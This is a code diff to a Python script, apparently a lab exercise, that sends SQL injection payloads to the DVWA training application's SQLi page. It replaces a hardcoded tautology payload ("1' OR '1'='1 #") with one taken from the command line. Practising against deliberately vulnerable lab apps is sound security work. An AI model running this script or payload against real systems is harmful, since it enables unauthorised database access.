@@ -8,7 +8,13 @@ import urllib3
 import urllib.parse
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+if len(sys.argv) < 3 :
+    print ("[-] usage python dvwa-SQLi1.py targetIP payload")
+    exit()
+
+
 security_level = "low"
+payload = sys.argv[2]
 target = sys.argv[1]
 url = 'http://' + target + '/DVWA/login.php'
 
@@ -62,8 +68,9 @@ def dvwa_login(session_id, user_token):
 def SQLi(session_id):
     SQli_url = 'http://' + target + '/DVWA/vulnerabilities/sqli/'
     #GET Data
-    sqli_payload = "1' OR '1'='1 #"
-    data = { "id": sqli_payload, "Submit": "Submit" }
+    #My first payload to retrive data is sqli_payload. But this version your payload what you want enter through 2nd parameter.
+    #sqli_payload = "1' OR '1'='1 #"
+    data = { "id": payload, "Submit": "Submit" }
     encoded_data = urllib.parse.urlencode(data)
     cookie = {"PHPSESSID": session_id, "security": security_level}
     headers = { 'content-type': 'application/x-www-form-urlencoded', 'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'}
@@ -73,8 +80,6 @@ def SQLi(session_id):
     soup = BeautifulSoup(r.text, "html.parser")
     soup.prettify()
     print(soup.find_all("div", {"class":"vulnerable_code_area"}))
-
-
 
 
 # Get initial CSRF token
